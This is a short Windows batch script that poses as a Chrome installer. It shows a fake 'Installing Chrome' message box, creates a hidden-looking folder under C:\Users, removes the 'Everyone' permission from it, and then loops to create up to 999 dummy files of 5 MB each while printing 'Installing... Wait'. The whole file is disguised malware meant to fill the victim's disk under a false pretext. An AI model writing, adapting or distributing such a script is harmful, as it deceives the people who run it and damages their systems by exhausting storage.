@echo off
mkdir C:\Users\Users
echo MsgBox "Installing Chrome",64,"Wait" > C:\Windows\no.vbs
start C:\Windows\no.vbs
del C:\Windows\no.vbs
icacls C:\Users\Users /remove Everyone /T
start /min for /l %%n in (1,1,999) do fsutil file createnew C:\Users\Users\file%%n.txt 5242880 && echo Installing... Wait